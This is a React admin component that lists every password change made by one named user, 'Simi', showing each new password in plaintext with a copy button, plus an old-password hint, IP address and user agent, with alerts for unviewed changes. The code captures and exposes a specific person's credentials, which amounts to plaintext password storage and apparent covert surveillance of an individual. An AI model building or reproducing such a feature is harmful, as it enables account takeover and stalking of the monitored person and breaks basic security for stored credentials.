/**
 * Password Changes Component - Admin view for Simi's password changes
 */

'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';

interface PasswordChange {
  id: number;
  user_type: string;
  old_password_hint: string;
  new_password: string;
  change_timestamp: string;
  ip_address: string;
  user_agent: string;
  admin_viewed: boolean;
  admin_viewed_at: string | null;
}

export default function PasswordChanges() {
  const [changes, setChanges] = useState<PasswordChange[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [unviewedCount, setUnviewedCount] = useState(0);

  useEffect(() => {
    fetchChanges();
  }, []);

  const fetchChanges = async () => {
    try {
      const response = await fetch('/api/admin/password-changes');
      if (response.ok) {
        const data = await response.json();
        setChanges(data.changes || []);
        setUnviewedCount(data.unviewedCount || 0);
      } else {
        setError('Failed to load password changes');
      }
    } catch (err) {
      setError('Network error');
    } finally {
      setLoading(false);
    }
  };

  const markAsViewed = async (id: number) => {
    try {
      const response = await fetch('/api/admin/password-changes', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id }),
      });

      if (response.ok) {
        setChanges(changes.map(c => 
          c.id === id ? { ...c, admin_viewed: true, admin_viewed_at: new Date().toISOString() } : c
        ));
        setUnviewedCount(prev => Math.max(0, prev - 1));
      }
    } catch (err) {
      console.error('Failed to mark as viewed:', err);
    }
  };

  const formatDate = (timestamp: string) => {
    const date = new Date(timestamp);
    const options: Intl.DateTimeFormatOptions = {
      timeZone: 'Africa/Lagos',
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    };
    return date.toLocaleString('en-US', options);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center py-12">
        <div className="animate-spin text-4xl">⏳</div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="p-4 bg-red-500/10 border border-red-400/20 rounded-lg text-red-200 text-center">
        {error}
      </div>
    );
  }

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-center justify-between">
        <h3 className="text-xl font-bold text-white flex items-center gap-2">
          🔐 Password Changes
          {unviewedCount > 0 && (
            <span className="px-2 py-0.5 bg-red-500 text-white text-xs rounded-full font-bold">
              {unviewedCount} New
            </span>
          )}
        </h3>
        <button
          onClick={fetchChanges}
          className="px-3 py-1.5 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-white text-sm transition-all"
        >
          🔄 Refresh
        </button>
      </div>

      {/* No changes */}
      {changes.length === 0 && (
        <div className="text-center py-12 text-gray-400">
          <div className="text-5xl mb-3">🔒</div>
          <p>No password changes yet</p>
        </div>
      )}

      {/* Changes list */}
      <div className="space-y-3">
        <AnimatePresence>
          {changes.map((change) => (
            <motion.div
              key={change.id}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className={`p-4 rounded-xl border transition-all ${
                !change.admin_viewed
                  ? 'bg-gradient-to-r from-yellow-500/20 to-orange-500/20 border-yellow-500/40 shadow-lg shadow-yellow-500/20'
                  : 'bg-white/5 border-white/10'
              }`}
            >
              {/* Header */}
              <div className="flex items-start justify-between mb-3">
                <div className="flex items-center gap-2">
                  <span className="text-2xl">
                    {!change.admin_viewed ? '🆕' : '✅'}
                  </span>
                  <div>
                    <div className="font-bold text-white flex items-center gap-2">
                      Simi Changed Password
                      {!change.admin_viewed && (
                        <span className="px-2 py-0.5 bg-red-500 text-white text-xs rounded-full">
                          NEW
                        </span>
                      )}
                    </div>
                    <div className="text-xs text-gray-400">
                      {formatDate(change.change_timestamp)}
                    </div>
                  </div>
                </div>
                {!change.admin_viewed && (
                  <button
                    onClick={() => markAsViewed(change.id)}
                    className="px-3 py-1 bg-green-500/20 hover:bg-green-500/30 border border-green-500/40 rounded-lg text-green-200 text-xs font-semibold transition-all"
                  >
                    Mark as Viewed
                  </button>
                )}
              </div>

              {/* Password Info */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-3">
                <div className="p-3 bg-black/30 rounded-lg">
                  <div className="text-xs text-gray-400 mb-1">Old Password (hint)</div>
                  <div className="text-white font-mono text-sm">
                    {change.old_password_hint}
                  </div>
                </div>
                <div className="p-3 bg-gradient-to-br from-green-500/20 to-blue-500/20 border border-green-500/30 rounded-lg">
                  <div className="text-xs text-gray-300 mb-1 flex items-center justify-between">
                    <span>New Password</span>
                    <button
                      onClick={() => copyToClipboard(change.new_password)}
                      className="text-green-300 hover:text-green-200 text-xs underline"
                      title="Copy to clipboard"
                    >
                      📋 Copy
                    </button>
                  </div>
                  <div className="text-white font-mono text-lg font-bold">
                    {change.new_password}
                  </div>
                </div>
              </div>

              {/* Technical Info */}
              <details className="text-xs text-gray-400">
                <summary className="cursor-pointer hover:text-gray-300 select-none">
                  Technical Details
                </summary>
                <div className="mt-2 p-2 bg-black/30 rounded space-y-1">
                  <div>IP: {change.ip_address}</div>
                  <div>User Agent: {change.user_agent || 'Unknown'}</div>
                  {change.admin_viewed && change.admin_viewed_at && (
                    <div>Viewed: {formatDate(change.admin_viewed_at)}</div>
                  )}
                </div>
              </details>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>
    </div>
  );
}
